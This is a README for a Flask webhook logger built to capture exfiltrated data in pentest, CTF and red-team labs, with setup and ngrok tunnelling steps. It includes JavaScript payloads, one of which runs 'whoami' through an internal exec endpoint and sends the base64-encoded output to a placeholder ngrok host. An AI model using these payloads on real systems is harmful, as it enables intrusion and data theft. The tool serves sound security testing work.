# Webhook Logger with Auto-Refresh Log Viewer

This Flask app acts as a simple webhook endpoint for logging incoming HTTP requests — perfect for XSS, RCE, CSRF payload capture during pentests or CTFs.

It provides:
- `/log` – accepts POST/GET data and logs it
- `/view` – a responsive, scrollable web UI to view logs (auto-refreshes every 5s)

---

## Features

- Logs stored in `logs/payloads.log`
- Auto-refresh every 5 seconds
- Scrollable UI to handle long logs
- CORS-compatible
- Great for XSS/RCE exfil testing

---

## Requirements

- Python 3.x
- Flask

Install with:

```bash
pip install flask flask-cors
```

---

## Usage

```bash
python webhook.py
```

- Webhook POST endpoint: [http://localhost:8080/log](http://localhost:8080/log)
- Log viewer UI: [http://localhost:8080/view](http://localhost:8080/view)

---

## Remote Access via Ngrok (Expose to Internet)

To expose your local Flask server publicly using Ngrok:

```bash
docker run --rm -it --network=host -e NGROK_AUTHTOKEN=Your-AUth-Token ngrok/ngrok http 8080
```

Then use the generated Ngrok URL in your XSS payloads like:

```javascript
fetch("https://your-ngrok-url.ngrok-free.app/log", {
  method: "POST",
  body: "XSS triggered!"
});
```

---

## Example Payload

```javascript
fetch("http://your-server:8080/log", {
  method: "POST",
  body: "XSS triggered!"
});
```

Or exfil output from RCE:

```javascript
fetch("http://127.0.0.1:9000/internal/exec", {
  method: "POST",
  body: "whoami"
})
.then(r => r.text())
.then(t => fetch("https://your-ngrok-url.ngrok-free.app/log", {
  method: "POST",
  body: btoa(t)
}));
```

---

## Log File

All data is saved in:
```
logs/payloads.log
```

---

## Notes

- You can tunnel this using `ngrok` to receive data from remote browsers.
- Default port is `8080`, change as needed in `app.run()`.

---

## Author

**w01f**

Custom-built for payload exfiltration labs, CTF chains, and Red Team automation.